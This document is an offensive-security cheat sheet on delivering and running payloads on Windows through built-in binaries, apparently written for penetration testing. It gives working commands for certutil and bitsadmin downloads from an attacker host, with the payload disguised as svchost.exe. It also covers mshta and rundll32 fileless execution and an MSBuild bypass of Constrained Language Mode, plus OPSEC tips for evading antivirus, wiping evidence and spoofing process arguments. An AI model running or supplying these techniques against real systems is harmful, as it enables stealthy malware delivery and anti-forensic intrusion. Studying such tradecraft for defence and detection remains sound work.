# LOLBin Payload Delivery

## Scenario
Need to download and execute payload on Windows without triggering AV on common tools.

## Step 1: Certutil Download (LOLBin)
```cmd
:: certutil is a legitimate Windows certificate utility
C:\> certutil -urlcache -split -f http://10.10.14.5/payload.exe C:\Windows\Temp\svchost.exe
****  Online  ****
  000000  ...
  00c800
CertUtil: -URLCache command completed successfully.

:: Clean certutil cache to remove evidence
C:\> certutil -urlcache -split -f http://10.10.14.5/payload.exe delete
```

## Step 2: MSHTA Execution (Fileless)
```cmd
:: Execute HTA payload directly from URL — no file on disk
C:\> mshta http://10.10.14.5/payload.hta

:: Or base64-encoded inline
C:\> mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd /c whoami > C:\Windows\Temp\out.txt"", 0:close")
```

## Step 3: Rundll32 with JavaScript
```cmd
:: Execute JavaScript via rundll32
C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("cmd /c whoami")
```

## Step 4: BITSAdmin Download
```cmd
:: BITS (Background Intelligent Transfer Service) — legitimate Windows service
C:\> bitsadmin /transfer myDownloadJob /download /priority high http://10.10.14.5/tool.exe C:\Windows\Temp\tool.exe
```

## Step 5: PowerShell Constrained Language Bypass
```powershell
# If PowerShell is in Constrained Language Mode
PS C:\> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

# Use MSBuild to execute C# code (bypasses CLM)
# Create inline task file:
PS C:\> @'
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Exec">
    <Exec Command="whoami" />
  </Target>
</Project>
'@ | Out-File C:\Windows\Temp\build.xml

PS C:\> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Windows\Temp\build.xml
Microsoft (R) Build Engine version 4.8.4084.0
Build started 1/15/2025 7:45:00 PM.
  whoami
  nt authority\system
Build succeeded.
```

## LOLBin Summary Table

| LOLBin | Use | OPSEC |
|--------|-----|-------|
| certutil | Download files | 🟡 Moderate — cached, logged by some EDR |
| mshta | Execute HTA/VBS | 🟡 Moderate — common in attacks, may be monitored |
| rundll32 | Execute DLLs/JS | 🟢 Quiet — normal system binary |
| bitsadmin | Download files | 🟢 Quiet — legitimate Windows service |
| MSBuild | Execute C# code | 🟡 Moderate — bypasses AppLocker, may trigger |
| regsvr32 | Execute DLLs | 🟡 Moderate — "squiblydoo" attack is well-known |
| wmic | Remote execution | 🟡 Moderate — WMI activity logged |

## OPSEC Notes
- LOLBins are signed Microsoft binaries — trusted by default
- AppLocker/WDAC may still block some LOLBins in hardened environments
- Combine with process argument spoofing for additional stealth
- Clean up any downloaded files and caches after use
- Check LOLBAS Project (lolbas-project.github.io) for full list
